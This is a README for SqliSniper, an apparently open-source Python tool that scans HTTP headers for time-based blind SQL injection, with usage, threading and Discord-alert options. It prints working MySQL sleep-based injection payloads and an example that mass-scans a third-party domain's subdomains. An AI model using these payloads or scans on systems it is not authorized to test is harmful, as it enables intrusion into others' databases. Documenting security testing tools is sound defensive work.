# SqliSniper
**SqliSniper** is a robust Python tool designed to detect time-based blind SQL injections in HTTP request headers. It enhances the security assessment process by rapidly scanning and identifying potential vulnerabilities using advanced multi-threaded techniques.

## Key Features
- **Time-Based Blind SQL Injection Detection:** Pinpoints potential SQL injection vulnerabilities in HTTP headers.
- **Multi-Threaded Scanning:** Offers faster scanning capabilities through concurrent processing.
- **Discord Notifications:** Sends alerts via Discord webhook for detected vulnerabilities.
- **False Positive Checks:** Implements response time analysis to differentiate between true positives and false alarms.
- **Custom Payload and Headers Support:** Allows users to define custom payloads and headers for targeted scanning.


## Installation
```
git clone https://github.com/danialhalo/SqliSniper.git
cd SQLSniper
chmod +x sqlisniper.py
pip3 install -r requirements.txt
```
# Usage:

This will display help for the tool. Here are all the options it supports.
```
ubuntu:~/sqlisniper$ ./sqlisniper.py -h


███████╗ ██████╗ ██╗     ██╗    ███████╗███╗   ██╗██╗██████╗ ███████╗██████╗
██╔════╝██╔═══██╗██║     ██║    ██╔════╝████╗  ██║██║██╔══██╗██╔════╝██╔══██╗
███████╗██║   ██║██║     ██║    ███████╗██╔██╗ ██║██║██████╔╝█████╗  ██████╔╝
╚════██║██║▄▄ ██║██║     ██║    ╚════██║██║╚██╗██║██║██╔═══╝ ██╔══╝  ██╔══██╗
███████║╚██████╔╝███████╗██║    ███████║██║ ╚████║██║██║     ███████╗██║  ██║
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝    ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝

                            -: By Muhammad Danial :-

usage: sqlisniper.py [-h] [-u URL] [-r URLS_FILE] [-p] [--proxy PROXY] [--payload PAYLOAD] [--single-payload SINGLE_PAYLOAD] [--discord DISCORD] [--headers HEADERS]
                     [--threads THREADS]

Detect SQL injection by sending malicious queries

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     Single URL for the target
  -r URLS_FILE, --urls_file URLS_FILE
                        File containing a list of URLs
  -p, --pipeline        Read from pipeline
  --proxy PROXY         Proxy for intercepting requests (e.g., http://127.0.0.1:8080)
  --payload PAYLOAD     File containing malicious payloads (default is payloads.txt)
  --single-payload SINGLE_PAYLOAD
                        Single payload for testing
  --discord DISCORD     Discord Webhook URL
  --headers HEADERS     File containing headers (default is headers.txt)
  --threads THREADS     Number of threads
```

# Running SQliSniper
### Single Url Scan
The url can be provided with `-u flag` for single site scan
```
./sqlisniper.py -u http://example.com
```
### File Input
This will run the tool with the `-r flag` against all the urls in urls.txt.
```
./sqlisniper.py -r url.txt
```
### Pipeline
The SqliSniper can also worked with the pipeline input with `-p flag`
```
cat url.txt | ./sqlisniper.py -p
```
This is helpful when integrating with other tools. For example we can use the subfinder , httpx and then pipe the output to SqliSniper for mass scanning
```
subfinder -silent -d google.com | sort -u | httpx -silent | ./sqlisniper.py -p
```
### Scanning with custom payloads  
By default the SqliSniper use the payloads.txt file. However `--payload flag` can be used for providing custom payloads file.
```
./sqlisniper.py -u http://example.com --payload mssql_payloads.txt
```
While using the custom payloads file, ensure that you substitute the sleep time with `%__TIME_OUT__%`. SqliSniper dynamically adjusts the sleep time iteratively to mitigate potential false positives.
The payloads file should look like this.
```
ubuntu:~/sqlisniper$ cat payloads.txt 
0\"XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))XOR\"Z
"0"XOR(if(now()=sysdate()%2Csleep(%__TIME_OUT__%)%2C0))XOR"Z"
0'XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))XOR'Z
```
### Scanning with single payloads
If you want to only test with the single payload `--single-payload flag` can be used. Make sure to replace the sleep time with `%__TIME_OUT__%`
```
./sqlisniper.py -r url.txt --single-payload "0'XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))XOR'Z"
```
### Scanning Custom Header 
Headers are saved in the file headers.txt for scanning custom header save the custom HTTP Request Header in headers.txt file. 
```
ubuntu:~/sqlisniper$ cat headers.txt 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
X-Forwarded-For: 127.0.0.1
```
### Sending Discord Alert Notifications
SqliSniper also offers Discord alert notifications, enhancing its functionality by providing real-time alerts through Discord webhooks. This feature proves invaluable during large-scale scans, allowing prompt notifications upon detection.
```
./sqlisniper.py -r url.txt --discord <web_hookurl>
```
### Multi-Threading 
Threads can be defined with `--threads flag`
```
 ./sqlisniper.py -r url.txt --threads 10
```
**Note:** It is crucial to consider that **employing a higher number of threads might lead to potential false positives or overlooking valid issues**. Due to the nature of time-based SQL injection it is recommended to use lower thread for more accurate detection.

# Contributing
Contributions to SqliSniper are always welcome. Whether it's feature enhancements, bug fixes, or documentation improvements, every bit of help is appreciated.


# License
`SqliSniper` is distributed under [MIT License](https://github.com/danialhalo/SqliSniper/blob/main/LICENSE)

